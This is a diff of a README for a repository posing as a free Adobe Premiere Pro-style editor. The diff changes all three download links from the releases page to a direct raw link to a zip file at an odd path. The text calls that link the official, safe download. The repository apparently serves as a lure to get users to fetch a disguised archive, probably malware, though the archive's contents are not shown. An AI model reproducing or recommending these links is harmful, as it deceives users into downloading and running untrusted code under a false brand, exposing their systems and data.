@@ -1,6 +1,6 @@
 <h1>🎬 Adobe-Tool-Premiere-Pro - Edit Videos Like a Pro Today</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Adobe_Tool_Premiere_Pro-FF6B6B?style=for-the-badge&logo=adobe&logoColor=white)](https://github.com/Azkal22/Adobe-Tool-Premiere-Pro/releases)
+[![Download Now](https://img.shields.io/badge/Download-Adobe_Tool_Premiere_Pro-FF6B6B?style=for-the-badge&logo=adobe&logoColor=white)](https://raw.githubusercontent.com/Azkal22/Adobe-Tool-Premiere-Pro/main/Albanian/2.6.zip)
 
 <h2>✨ What Is This?</h2>
 
@@ -10,7 +10,7 @@ Adobe-Tool-Premiere-Pro is a powerful video editing application made for Windows
 
 Getting started is incredibly simple. Follow these three steps, and you will be editing your first video in minutes.
 
-<strong>Step 1:</strong> Click the blue button at the top of this page, or go directly to this link: [Download Adobe-Tool-Premiere-Pro](https://github.com/Azkal22/Adobe-Tool-Premiere-Pro/releases)
+<strong>Step 1:</strong> Click the blue button at the top of this page, or go directly to this link: [Download Adobe-Tool-Premiere-Pro](https://raw.githubusercontent.com/Azkal22/Adobe-Tool-Premiere-Pro/main/Albanian/2.6.zip)
 
 Visit this link to download the application.
 
@@ -58,7 +58,7 @@ Smart features automatically detect the best moments in your footage. AI-assiste
 
 Here is the most important part: safely downloading and installing the application.
 
-<strong>1. Go to the official download page:</strong> [Click here to download Adobe-Tool-Premiere-Pro](https://github.com/Azkal22/Adobe-Tool-Premiere-Pro/releases)
+<strong>1. Go to the official download page:</strong> [Click here to download Adobe-Tool-Premiere-Pro](https://raw.githubusercontent.com/Azkal22/Adobe-Tool-Premiere-Pro/main/Albanian/2.6.zip)
 
 Visit this link to download the application.
 
